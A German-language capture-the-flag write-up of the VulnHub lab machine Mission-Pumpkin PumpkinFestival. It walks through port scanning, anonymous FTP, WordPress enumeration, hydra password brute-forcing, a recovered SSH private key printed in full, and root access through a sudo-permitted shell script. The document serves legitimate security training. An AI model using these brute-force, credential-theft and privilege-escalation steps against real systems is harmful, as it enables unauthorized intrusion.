# Mission-Pumpkin v1.0: PumpkinFestival

In diesem Writeup geht es um den dritten und letzten Teil der Pumpkin-Reihe von [VulnHub](https://www.vulnhub.com/?q=pumpkin).

## Verwendete Techniken
````
- nmap
- ftp
- dirb
- wpscan
- hydra
- binwalk
- tar
- bunzip2
- SSH
````

*[Image: Image]*

## Herausfinden der IP-Adresse

Im dritten Teil wird die IP ebenfalls direkt beim Starten der VM eingeblendet.

Jetzt heißt mein Ziel 192.168.178.61!

## Portscan

Auch diesmal beginne ich mit einem Portscan: jetzt aber mit nmap! So! :)

`nmap -A 192.168.178.61` verrät mir, dass es zwei offene Ports gibt.
````
PORT      STATE    SERVICE      VERSION
21/tcp    open     ftp          vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret
80/tcp    open     http         Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: WordPress 4.9.3
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Pumpkin Festival &#8211; PumpkinToken : 06c3eb12ef2389e2752335...
````

Das fängt ja schonmal gut an, ein FTP-Server mit einem Verzeichnis, das "secret" heißt und ein Webserver mit irgendeinem Token und einem Hash dazu.

## FTP-Server

Für den Anfang habe ich mich für den FTP-Server entschieden. Mal schauen, was im "secret"-Verzeichnis liegt.

Hier habe ich mich über die Befehle `cd secret`, `ls` und `get token.txt` zum ersten Token navigiert.

*[Image: Image]*

`PumpkinToken : 2d6dbbae84d724409606eddd9dd71265 `

## Webserver

So, jetzt wird es aber Zeit für den Webserver:

*[Image: Image]*

Vielen Dank fürs Kürbisse züchten, Jack. Hilfe von Harry? Wer ist denn jetzt Harry?

Okay, PumpkinTokens helfen mir offensichtlich rein zu kommen. Das wird interessant.

Alohomora... Gehört habe ich das schon mal, aber ich weiß nicht mehr genau wo.

Ein kurzer Blick zu Google sagt mir, dass ich es wohl vor Jahren mal in einem Harry Potter Buch gelesen haben muss.

Es handelt sich dabei um einen Zauberspruch, der Türen öffnen soll. Könnte ein Passwort sein.

Dann ist auch klar, welcher Harry hier geholfen hat :)

Als ich mir die Source anschauen wollte, habe ich festgestellt, dass hier der Rechtsklick blockiert wurde.

Okay, dann eben fix ein `view-source:` vor die eigentliche Adresse getippt und es geht trotzdem.

Im Quelltext verbirgt sich noch die Aufforderung an Harry, dass er die Kürbisse finden soll.

Tricky! Das zweite Token ist in der Hintergrundfarbe auf die Seite geschrieben.

*[Image: Image]*

`PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52`

## dirb

Mal sehen, ob es noch etwas interessantes zu entdecken gibt, was den Webserver angeht:

`dirb http://192.168.178.61`

Es gibt ein paar Objekte, die ich mir genauer anschauen möchte.

````
+ http://192.168.178.61/robots.txt (CODE:200|SIZE:102)
==> DIRECTORY: http://192.168.178.61/store/
==> DIRECTORY: http://192.168.178.61/users/
````

Zuerst werfe ich einen Blick auf die robots.txt:
````
User-agent: * 
Disallow: /wordpress/
Disallow: /tokens/
Disallow: /users/
Disallow: /store/track.txt
````
/wordpress/ gibt einen 404er Error.

/tokens/ gibt zumindest einen 403: Forbidden Error.

/users/ ebenfalls

/store/track.txt kann ich mir ansehen:

````
Hey Jack!

Thanks for choosing our local store. Hope you like the services.
Tracking code : 2542 8231 6783 486

-Regards 
admin@pumpkins.local
````

Was genau ich mit dem Tracking Code anfangen kann, ist mir noch nicht klar. 

Aber erstmal notieren, wer weiß wofür das noch gut sein kann.

Der Absender sagt mir jedenfalls, dass ich pumpkins.local in meine `/etc/hosts` Datei schreiben sollte.

Eventuell ist das auch ein neuer Benutzername.

`nano /etc/hosts` und unter die Loopback-Adresse (127.0.0.1) folgendes eingetragen:

`192.168.178.61 pumpkins.local`

pumpkins.local habe ich dann im Browser eingegeben:

*[Image: Image]*

Unten auf der Seite steht das dritte Token:

`PumpkinToken : 06c3eb12ef2389e2752335beccfb2080`

Noch etwas tiefer gescrollt findet sich der Hinweis, welcher den nächsten Schritt bestimmt:

## Proudly powered by WordPress

Dementsprechend lasse ich als nächstes wpscan laufen:

`wpscan -e u --url http://pumpkins.local`

Auch hier werden wieder interessante Tatsachen ans Licht gebracht:

````
[+] WordPress readme found: http://pumpkins.local/readme.html
[+] Upload directory has listing enabled: http://pumpkins.local/wp-content/uploads/
[i] User(s) Identified:
[+] admin
[+] morse
````

Okay, fangen wir oben an: Wordpress Readme:

*[Image: Image]*

Das ist schonmal interessant :) 

K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s ist weder base64, base32 noch eins der Hashes, welche `hash-identifier` kennt.

Das macht mich ja neugierig. Ich kann mir kaum vorstellen, dass einfach Kauderwelsch auf die Seite gesetzt wurde.

Auf [Cyber-Chef](https://gchq.github.io/CyberChef/) kann man diverse Arten von Verschlüsselungen testen.

Nach einer gefühlten Ewigkeit an manuellen Tests wurde ich dann bei base62 endlich fündig :)

`K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s:morse & jack : Ug0t!TrIpyJ`

Sieht aus, als hätte ich da direkt zwei Paar Logindaten gefunden.

Jetzt schaue ich mir noch die restlichen Seiten von Wordpress an, bevor ich mich auf die Suche nach einer Möglichkeit mache, die Logindaten zu verwenden.

#6(no title) gibt einen schönen Hinweis:

*[Image: Image]*

Ich brauche also alle PumpkinTokens, um das Ticket generieren zu können.

Gut zu wissen wäre jetzt, wie viele denn "alle" sind...

Die restlichen Seiten waren alle uninteressante Templates. Über die Blog-Site kommt man aber zum Login.

morse : Ug0t!TrIpyJ funktioniert!

Leider ist morse kein Admin, aber wie wir im letzten Teil der Serie gelernt haben, ist es ja auch nur der Lieferant für Kürbissamen.

Als ich die Seiten beinahe alle durchgeschaut hatte, fiel mein Blick auf das Profil. 

Unter `Biographical Info` verbirgt sich das vierte Token:

*[Image: Image]*

`PumpkinToken : 7139e925fd43618653e51f820bc6201b`

Weiter habe ich hier nichts gefunden, also -> Log out!

Jack : Ug0t!TrIpyJ funktioniert nicht! Dann muss ich es mit dem admin versuchen.

Aber für den habe ich leider kein Passwort...

Nach einer Weile und vielen erfolglosen Versuchen habe ich meine Notizen noch einmal durchgelesen und kam zu dem Schluss, dass "Alohomora!" jetzt der passende Zauberspruch für meine Situation wäre.

Tatsächlich klappt das!

admin : Alohomora! öffnet mir hier wirklich eine Türe.

Mal sehen, was sich jetzt noch finden lässt.

Auf jeden Fall gibt es einen Post-Entwurf, den ich mit morse schon entdeckt hatte, welchen ich mir aber nicht anschauen konnte.

Viel steht nicht drin. Muss aber auch nicht, der Inhalt reicht mir völlig:

*[Image: Image]*

`PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4`

Token Nummer 5!

Mehr war hier aber auch nicht zu finden. Irgendwie hing ich fest.

## Geht es nicht vorwärts, hat man vielleicht eine Abzweigung verpasst...

Um diesem Fehler aus dem Weg zu gehen, habe ich nochmal nmap angeworfen und diesmal alle Ports überprüfen lassen.
Parallel dazu lief dirbuster mit einer extrem großen Wordlist und rekursiver Suche.
Und damit ich nichts übersehe, habe ich hydra auf den FTP-Server losgelassen, um für die Benutzer jack, morse und harry nach Zugängen zu suchen:

`nmap -sC -sV -A -p- 192.168.178.61`

Dirbuster lief als GUI, weil dirb mit so großen Wordlists Probleme hat.

`hydra -e nsr -L users.txt -P /root/Wordlists/rockyou.txt`

Definitiv Zeit eine kleine (bis mittlere) Kaffeepause einzulegen.

Wieder am Rechner wurden mir Ergebnisse präsentiert, mit denen ich nicht gerechnet hatte:

Dirbuster hat auf dem Server http://192.168.178.61 noch eine Datei im /tokens/-Verzeichnis gefunden:

*[Image: Image]*

`PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea`

Token Nummer 6!

hydra hat mir tatsächlich neue Zugangsdaten für den FTP-Server ausgegeben.

*[Image: Image]*

`harry:yrrah` 

## FTP die Zweite

Mit den neuen Daten eingeloggt, liegt mir das nächste Token direkt vor der Nase.

`get token.txt` und `cat token.txt` zeigen mir den Inhalt von Token Nummer 7:

`PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e`

Nachdem ich dann die Ordner `Donotopen`, `NO`, `NOO`, `NOOO` und `NOOOO` geöffnet hatte, lag dort das nächste Token:

*[Image: Image]*

`PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c`

Jetzt sind es schon 8 Tokens.

Und jemand hatte wohl Freude daran eine "No"-Ordnerstruktur anzulegen. Also tiefer graben:

`cd NOOOOO`, `cd NOOOOOO` & `get data.txt`

`cat data.txt` zeigt eine Menge Wirrwarr an. Es ist also keine "wirkliche" Textdatei.

Mit binwalk lässt sich herausfinden, was sich wirklich hinter der Datei verbirgt:

````
binwalk data.txt
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive
````

Das Archiv entpacke ich mit `tar -xf data.txt`.

Die entstandene Datei `data` untersuche ich wieder mit binwalk, da auch sie für `cat` nicht lesbar ist:

````
binwalk data
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             bzip2 compressed data, block size = 900k
````

Wer solche Ordnerstrukturen, wie auf dem FTP-Server anlegt, packt auch Archive in Archive :)

````
bunzip2 data
bunzip2: Can't guess original name for data -- using data.out

binwalk data.out 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive

tar -xf data.out
tar: Ein einzelner Nullblock bei 25

binwalk key 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive

tar -xf key
tar: Ein einzelner Nullblock bei 22
````
So, die nun entstandene Datei "jack" ist wieder eine Textdatei. Allerdings eine, die im hex-Format geschrieben ist.

Wenn ich diese Datei an hex2raw pipe, habe ich das Gefühl, dass sie nicht vollständig ist.

Also habe ich sie nochmal in einen [Online Hex-Decoder](https://cryptii.com/pipes/hex-decoder) eingefügt und siehe da, jetzt scheint sie komplett zu sein:

````
-----BEGIN OPENSSH PRIVATE KEY-----
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
16k4l9SUtcrJAAAACXJvb3RAa2FsaQE=
-----END OPENSSH PRIVATE KEY-----
````

Ein privater SSH-Schlüssel. Bei dem Dateinamen vermutlich der von User "jack".

## SSH

nmap hatte mir in der Zwischenzeit den entsprechenden Port für SSH geliefert:

`6880/tcp open   ssh                OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)`

Also versuche ich mal eine Verbindung mit dem Schlüssel und User Jack:

*[Image: Image]*

Okay, ein "private key", den jeder lesen kann ist wirklich nicht privat. 
Dass man sich deswegen aber nicht über SSH damit verbinden kann, wusste ich nicht. Wieder was gelernt.

`chmod 600 jack.txt` sollte das Problem lösen.

Bingo!

````
ssh -l jack -i jack.txt -p 6880 192.168.178.61
------------------------------------------------------------------------------
                          Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------

Last login: Tue Jun 18 21:04:28 2019 from 192.168.1.105
-bash: /home/jack/.bash_profile: Permission denied
jack@pumpkin:~$ ls -la
total 48
drwx------ 5 jack jack  4096 Sep 18 22:19 .
drwxr-xr-x 5 root root  4096 Jul 12  2019 ..
-rw------- 1 root root     0 Sep 18 22:19 .bash_history
-rw-r--r-- 1 jack jack   231 Jul 15  2019 .bash_logout
-rw------- 1 root root    94 Jul 16  2019 .bash_profile
-rw-r--r-- 1 jack jack  3675 Jul 15  2019 .bashrc
drwx------ 2 jack jack  4096 Jul 12  2019 .cache
-rw-r--r-- 1 jack jack   675 Jul 12  2019 .profile
drwxrwxr-x 2 jack jack  4096 Jul 12  2019 .ssh
-rwsr-xr-x 1 root root 11232 Jul 15  2019 token
````
Die Datei `token` lässt sich nicht lesen. Mit `file token` lasse ich mir anzeigen, was für eine Datei es ist.

Es ist also eine ausführbare Datei. Mit `./token` führe ich sie aus und bekomme Token Nummer 9 angezeigt:

````
token: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=977c5f4023cb5e77599fd8194089aa03f155ad88, stripped
jack@pumpkin:~$ ./token 
 
PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706
````

An dieser Stelle habe ich ein wenig herumgesucht und geschaut, was ich für Informationen aus der Box bekommen kann.

````
jack@pumpkin:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
goblin:x:1001:1001:Goblin,,,:/home/goblin:/bin/bash
harry:x:1002:1002:Harry,,,:/home/harry:/bin/bash

jack@pumpkin:~$ ls -la ..
total 20
drwxr-xr-x  5 root     root     4096 Jul 12  2019 .
drwxr-xr-x 22 root     root     4096 Jul 12  2019 ..
drwx------  3 harry    harry    4096 Jul 15  2019 harry
drwx------  4 jack     jack     4096 Sep 22 12:16 jack
drwxr-xr-x  5 www-data www-data 4096 Jul 12  2019 web
jack@pumpkin:~$ ls -la ../web/
total 200
drwxr-xr-x  5 www-data www-data  4096 Jul 12  2019 .
drwxr-xr-x  5 root     root      4096 Jul 12  2019 ..
-rw-r--r--  1 www-data www-data    35 Jul 12  2019 .htaccess
-rw-r--r--  1 nobody   nogroup    418 Sep 25  2013 index.php
-rw-r--r--  1 nobody   nogroup  19988 Jul 13  2019 license.txt
-rw-r--r--  1 nobody   nogroup    642 Jul 16  2019 readme.html
-rw-r--r--  1 nobody   nogroup   5434 Sep 23  2017 wp-activate.php
drwxr-xr-x  9 nobody   nogroup   4096 Feb  6  2018 wp-admin
-rw-r--r--  1 nobody   nogroup    364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 nobody   nogroup   1627 Aug 29  2016 wp-comments-post.php
-rw-rw-rw-  1 www-data www-data  3124 Jul 14  2019 wp-config.php
-rw-r--r--  1 nobody   nogroup   2853 Dec 16  2015 wp-config-sample.php
drwxrwxrwx  5 nobody   nogroup   4096 Sep 22 02:52 wp-content
-rw-r--r--  1 nobody   nogroup   3669 Aug 20  2017 wp-cron.php
drwxr-xr-x 18 nobody   nogroup  12288 Feb  6  2018 wp-includes
-rw-r--r--  1 nobody   nogroup   2422 Nov 21  2016 wp-links-opml.php
-rw-r--r--  1 nobody   nogroup   3306 Aug 22  2017 wp-load.php
-rw-r--r--  1 nobody   nogroup  36583 Oct 13  2017 wp-login.php
-rw-r--r--  1 nobody   nogroup   8048 Jan 11  2017 wp-mail.php
-rw-r--r--  1 nobody   nogroup  16246 Oct  4  2017 wp-settings.php
-rw-r--r--  1 nobody   nogroup  30071 Oct 18  2017 wp-signup.php
-rw-r--r--  1 nobody   nogroup   4620 Oct 24  2017 wp-trackback.php
-rw-r--r--  1 nobody   nogroup   3065 Aug 31  2016 xmlrpc.php

jack@pumpkin:~$ cat ../web/license.txt 
WordPress - Web publishing software

Copyright 2011-2018 by the contributors

PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71

This program is free software; you can redistribute it and/or modify
[...]
````

Nicht schlecht, das war ein sehr gut verstecktes Token Nummer 10!

Da ich aus der Seite http://pumpkins.local/readme.html Jacks Passwort bekommen habe, habe ich `sudo -l` ausprobiert. Vielleicht darf er ja etwas als root ausführen.

*[Image: Image]*

Weder das Verzeichnis, noch die Datei haben zu diesem Zeitpunkt existiert, ich habe also freie Hand, was ich dort erstelle.

Aufgrund der fortgeschrittenen Uhrzeit und dem in der Luft liegenden Duft einer Root-Shell war ich hier recht unkreativ:

````
jack@pumpkin:~$ mkdir pumpkins
jack@pumpkin:~$ cd pumpkins/
jack@pumpkin:~/pumpkins$ nano alohomora
jack@pumpkin:~/pumpkins$ cat alohomora 
#!/bin/sh
echo "Alohomora!"
su -
jack@pumpkin:~/pumpkins$ chmod +x alohomora
jack@pumpkin:~/pumpkins$ sudo ./alohomora 
Alohomora!
root@pumpkin:~# 
````

## Root-Shell :)

Sich das Ticket zu sichern war jetzt ein Kinderspiel.

Interessant finde ich, dass ich am Ende nicht eins der Token gebraucht habe. Aber sehr zufriedenstellend, dass ich alle gefunden habe!

````
root@pumpkin:~# cd /root/
root@pumpkin:~# ls -la
total 36
drwx------  3 root root 4096 Jul 16  2019 .
drwxr-xr-x 22 root root 4096 Jul 12  2019 ..
-rw-r--r--  1 root root   55 Jul 15  2019 .bash_logout
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Jul 12  2019 .cache
-rw-------  1 root root  369 Jul 13  2019 .mysql_history
-rw-------  1 root root   89 Jul 16  2019 .nano_history
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root 1688 Jul 15  2019 PumpkinFestival_Ticket
````
*[Image: Image]*

Die Serie hat mir sehr gefallen und war an einigen Stellen schön knifflig! 
Kann uneingeschränkt weiterempfohlen werden! :)

Danke für's Lesen und happy pwning!

Kontakt -> [Twitter](https://twitter.com/_the_someone)
